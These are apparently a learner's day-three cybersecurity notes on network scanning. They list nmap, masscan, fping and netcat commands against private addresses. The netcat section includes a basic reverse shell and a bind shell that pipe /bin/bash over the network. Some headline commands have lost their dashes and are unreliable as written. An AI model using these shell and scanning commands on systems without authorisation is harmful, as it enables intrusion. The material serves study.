<h1 align="center">🖥️ Day 03 🖥️</h1>
<h2 align="center">⚓ Network Scanning ⚓</h2>

---
### ✅ What is Network → 
A group of connected devices that communicate and share data.

### ✅ What is IP Address → 
A unique numerical address used to identify a device on a network.

### ✅ What is MAC Address → 
A unique physical hardware address assigned to a network interface.

---
## 🛸 Scanning Phase in Hacking →
The phase where an attacker **identifies live hosts, open ports, running services, and vulnerabilities** in a target network to prepare for exploitation.

 > - Identify live hosts
 > - Discover open or closed ports
 > - Detect running services & versions
 > - Identify operating systems
 > - Find security weaknesses

## 🌐 Types of Network Scanning

- **1️⃣ Port Scanning :-** Port scanning is the process of **identifying open ports and services running on a target system** by sending packets to check how it responds.

  > - **Find open, closed, and filtered ports.**
  > - *Examples :* TCP scan , UDP scan
  > - **nmap 192.168.1.10**

- **2️⃣ Network Scanning :-** Network scanning is the process of **discovering active (live) hosts** within a network.

  > - **Find which systems are alive.**
  > - *Examples :* ICMP scan, ARP scan
  > - **nmap -sn 192.168.1.0/24**

- **3️⃣ Vulnerability Scanning :-**

  Vulnerability scanning is the process of **identifying security weaknesses in a system** to determine whether it is exploitable.
  > - **The process of finding security weaknesses in a system that attackers could exploit.**

- [ ] **CVSS (Common Vulnerability Scoring System) →**
   > - Gives a severity score (0–10) to vulnerabilities; higher score means higher risk.

- [ ] **CVE (Common Vulnerabilities and Exposures) →**
   > - A unique ID list for publicly known security vulnerabilities, maintained by MITRE.

- [ ] **NVD (National Vulnerability Database) →**
   > - A US government database that provides detailed information about vulnerabilities and is linked with CVE data.

---
### 🛠️ What is TCP?
TCP (Transmission Control Protocol) is a way for two devices (like a computer and a server) to talk to each other over the internet.
 > - **It makes sure that the connection is reliable, meaning both devices are ready to send and receive information.**

### Three Way Handshake:
Before any real communication happens, they need to make sure they’re both ready. **This is done in 3 steps.**

 1. **SYN (Request) :** Client says, _"Hi, can we talk?"_
 2. **SYN-ACK (Response) :** Server says, _"Okay, I'm ready."_
 3. **ACK (Confirmation) :** Client says, _"Great, let's talk!"_

---
## 🛠️ Scanning Tools

### Port Scanning Tools:
These tools help **identify open ports on a system**, giving attackers insight into available services and potential vulnerabilities.

**🏗️ Nmap :** One of the most popular and versatile port scanning tools.
  - [X]  It helps discover hosts, services, operating systems, and open ports.

 - **Example Command :- nmap IP address**

   > - **nmap -sn 192.168.1.0/24  ::-** Ping Scan
   
   > - **nmap -sn -PR 192.168.1.0/24  ::-** ARP Scan (LAN only)

   > - **nmap -sT 192.168.1.10  ::-** TCP Connect Scan

   > - **nmap -sS 192.168.1.10  ::-** SYN Scan (Stealth Scan)
   
   > - **nmap -sF 192.168.1.10  ::-** FIN Scan

   > - **nmap -sN 192.168.1.10  ::-** NULL Scan

   > - **nmap -sV 192.168.1.10  ::-** Service Version Detection

   > - **nmap -A 192.168.1.10  ::-** Aggressive Scan

<div style="text-align: center;"><img src="https://github.com/Nikunj-Sahani/Cyber_Security_Prep_v.2/blob/main/Images/Nmap10.png" alt="Sample Image"></div>
<div style="text-align: center;"><img src="https://github.com/Nikunj-Sahani/Cyber_Security_Prep_v.2/blob/main/Images/Nmap11.png" alt="Sample Image"></div>
<div style="text-align: center;"><img src="https://github.com/Nikunj-Sahani/Cyber_Security_Prep_v.2/blob/main/Images/Nmap12.png" alt="Sample Image"></div>
<div style="text-align: center;"><img src="https://github.com/Nikunj-Sahani/Cyber_Security_Prep_v.2/blob/main/Images/Nmap13.png" alt="Sample Image"></div>

  ---
**🏗️ Netcat (nc):** Often called the "Swiss Army knife" of networking,
  - [X] It's used for scanning and banner grabbing from open ports.

 - **Example Command: nc zv IP 80,443**

   > - **nc -zv 192.168.1.10 80 ::-** Check if port is open
   
   > - **nc -zv 192.168.1.10 20-100 ::-** Scan multiple ports
  
   > - **nc -lvnp 4444 ::-** Listen on a port (server mode)
  
   > - **nc 192.168.1.10 4444 ::-** Connect to a listening port (client)
  
   > - **nc 192.168.1.10 4444 -e /bin/bash ::-** Reverse shell (basic)
  
   > - **nc -lvnp 4444 -e /bin/bash ::-** Bind shell
  
   > - **nc -lvnp 5555 > file.txt ::-** File transfer (receiver)

<div style="text-align: center;"><img src="https://github.com/Nikunj-Sahani/Cyber_Security_Prep_v.2/blob/main/Images/Netcat10.png" alt="Sample Image"></div>
<div style="text-align: center;"><img src="https://github.com/Nikunj-Sahani/Cyber_Security_Prep_v.2/blob/main/Images/Netcat11.png" alt="Sample Image"></div>

---
**🏗️ Masscan :** A very fast port scanner, often used for scanning large networks.
  - [X] Known as the **fastest port scanner, faster than Nmap,** but provides less detailed results.

- **Example Command: masscan IP p065535**

   > - **masscan 192.168.1.10 -p80 ::-** Scan a single IP
   
   > - **masscan 192.168.1.10 -p21,22,80,443 ::-** Scan multiple ports
  
   > - **masscan 192.168.1.10 -p1-65535 ::-** Scan all ports
  
   > - **masscan 192.168.1.0/24 -p80,443 ::-** Scan a network
  
   > - **masscan 192.168.1.0/24 -p80 --rate 1000 ::-** Set scan speed (rate)

<div style="text-align: center;"><img src="https://github.com/Nikunj-Sahani/Cyber_Security_Prep_v.2/blob/main/Images/Masscan10.png" alt="Sample Image"></div>
<div style="text-align: center;"><img src="https://github.com/Nikunj-Sahani/Cyber_Security_Prep_v.2/blob/main/Images/Masscan11.png" alt="Sample Image"></div>

---
**Fping :** A tool used for quickly pinging multiple devices to check which hosts are live on the network.
  - [X] It can ping multiple IPs simultaneously, making it faster than the standard ping.

**Example Command: fping a g (network range)**

  > - **fping -a -g 192.168.1.0/24**
  > - Only live hosts are displayed
  > - If 192.168.1.14 is live, the output will be: **The IP**

<div style="text-align: center;"><img src="https://github.com/Nikunj-Sahani/Cyber_Security_Prep_v.2/blob/main/Images/Fping10.png" alt="Sample Image"></div>

---
## Network Scanning Tools:
These tools are used to scan the network to identify hosts, active devices, and their vulnerabilities.

**🏗️ Zenmap :** A graphical interface for Nmap, making it easier to use for beginners. 
  - [X] Zenmap is GUI version of nmap - 
  - [X] **Windows Installer** - [Link to Go](https://nmap.org/download.html)



---
**Angry IP Scanner :** A simple and fast network scanner that allows you to scan local networks for active devices.
  - [X] **Windows Installer** - [Link to Go](https://angryip.org/download/)



---
**Advanced IP Scanner :** A network scanner that finds all devices on a local network and can also be used for remote shutdowns. Source : 
  - [X] **Windows Installer** - [Link to Go](https://www.advancedipscanner.com/)





